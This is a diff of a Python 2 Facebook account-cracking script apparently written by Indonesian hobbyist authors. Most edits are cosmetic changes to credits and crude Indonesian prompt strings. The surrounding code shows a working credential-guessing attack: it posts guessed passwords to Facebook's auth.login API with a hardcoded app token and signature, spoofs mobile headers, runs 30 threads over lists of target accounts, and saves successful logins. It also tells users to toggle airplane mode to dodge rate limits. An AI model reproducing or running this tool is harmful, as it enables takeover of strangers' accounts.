@@ -1,29 +1,31 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Yayan XD
+# code by Yayan
+# create by Aang Ardiansyah-XD
 # my facebook ( https://www.facebook.com/KM39453 )
 
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Yayan XD.
+#      Coded By Yayan
+#      Create by Aang Ardiansyah-XD
 
 import os
 try:
     import requests
 except ImportError:
-    print '\n [×] Modul requests belum terinstall!...\n'
+    print '\n [×] Modul requests belum terinstall bro!!...\n'
     os.system('pip2 install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print '\n [×] Modul Futures belum terinstall!...\n'
+    print '\n [×] Modul Futures belum terinstall bro!!...\n'
     os.system('pip2 install futures')
 
 try:
     import bs4
 except ImportError:
-    print '\n [×] Modul Bs4 belum terinstall!...\n'
+    print '\n [×] Modul Bs4 belum terinstall bro!!...\n'
     os.system('pip2 install bs4')
 
 import requests, os, re, bs4, sys, json, time, random, datetime
@@ -108,7 +110,7 @@ def hasil(ok,cp):
 def yayanxd():
     os.system('clear')
     print (' %s[•]%s Tools ini menggunakan login token facebook!!\n %s[•]%s Apakah kamu sudah tau cara mendapatkan token facebook?\n %s[•]%s Ketik %s(open)%s Untuk mendapatkan token facebook'%(O,N,O,N,O,N,H,N))
-    kontol = raw_input('\n %s[%s?%s] Masukan Token Dulu Lah Bro :%s '%(N,M,N,H))
+    kontol = raw_input('\n %s[%s?%s] Masukin Token Dulu Lah Bro :%s '%(N,M,N,H))
     if kontol in ('open', 'Open', 'OPEN'):
         print '\n%s [•]%s NOTE!!: usahakan pakai akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
         print '%s [•]%s jangan lupa!! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
@@ -129,7 +131,7 @@ def yayanxd():
         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
         moch_yayan()
     except KeyError:
-        print '\n\n %s[%s!%s] TOKEN INVALID NGENTOD!!'%(N,M,N);time.sleep(2);yayanxd()
+        print '\n\n %s[%s!%s] TOKEN NYA INVALID NGENTOD!!'%(N,M,N);time.sleep(2);yayanxd()
 
 ### ORANG GANTENG ###
 def moch_yayan():
@@ -602,7 +604,7 @@ class __crack__:
                         elif cin == '1':
                             print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
+                            print '\n [%s•%s] Jika tidak ada hasil aktifkan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -615,7 +617,7 @@ class __crack__:
                         elif cin == '2':
                             print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
+                            print '\n [%s•%s] Jika tidak ada hasil aktifkan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -628,7 +630,7 @@ class __crack__:
                         elif cin == '3':
                             print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
+                            print '\n [%s•%s] Jika tidak ada hasil aktifkan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -667,7 +669,7 @@ class __crack__:
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+            	_kontol = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.36.22.23.arm64;]'
             headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
             api = 'https://b-api.facebook.com/method/auth.login'
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
@@ -820,7 +822,7 @@ class __crack__:
         elif yan in ('1', '01'):
             print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
+            print '\n [%s•%s] Jika tidak ada hasil aktifkan mode pesawat (5 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -839,7 +841,7 @@ class __crack__:
         elif yan in ('2', '02'):
             print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
+            print '\n [%s•%s] Jika tidak ada hasil aktifkan mode pesawat (5 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -879,5 +881,19 @@ class __crack__:
             print '\n %s[%s×%s] input yang bener bangsat!!'%(N,M,N);self.__pler__()
 
 if __name__ == '__main__':
-    os.system('git pull')
+    os.system('git pull') 
     moch_yayan()
+    
+    
+    
+    
+    
+
+
+
+
+
+
+
+
+
